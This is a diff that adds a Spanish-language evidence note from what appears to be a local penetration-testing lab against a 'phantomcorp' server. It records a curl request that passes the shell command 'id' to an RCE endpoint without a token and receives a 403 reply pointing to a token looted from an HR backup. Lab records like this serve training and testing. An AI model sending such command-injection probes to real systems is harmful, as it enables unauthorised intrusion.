@@ -1,0 +1,9 @@
+# R4-01 — /api/reporte SIN token: el endpoint RCE está gateado por el token looteado en R3.
+# Instancia fiel local del server.py del lab (127.0.0.1:8080). En el target Docker: http://phantomcorp/
+$ curl -i 'http://phantomcorp/api/reporte?cmd=id'
+HTTP/1.0 403 Forbidden
+Server: PhantomClientes/2.0 
+Date: Thu, 19 Nov 2026 22:06:35 GMT
+Content-Type: text/plain
+
+token invalido; conseguilo del backup de RRHH
